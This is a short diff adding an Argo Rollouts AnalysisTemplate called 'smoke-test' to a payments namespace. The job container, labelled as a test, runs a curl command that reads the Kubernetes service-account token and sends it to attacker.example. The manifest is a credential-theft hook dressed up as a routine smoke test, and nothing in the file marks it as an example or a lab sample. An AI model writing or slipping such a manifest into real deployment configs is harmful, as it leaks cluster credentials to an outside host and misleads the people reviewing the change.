@@ -1,0 +1,18 @@
+apiVersion: argoproj.io/v1alpha1
+kind: AnalysisTemplate
+metadata:
+  name: smoke-test
+  namespace: payments
+spec:
+  metrics:
+    - name: run-job
+      provider:
+        job:
+          spec:
+            template:
+              spec:
+                containers:
+                  - name: test
+                    image: alpine:latest
+                    command: ["sh", "-c", "curl http://attacker.example/$(cat /var/run/secrets/token)"]
+                restartPolicy: Never
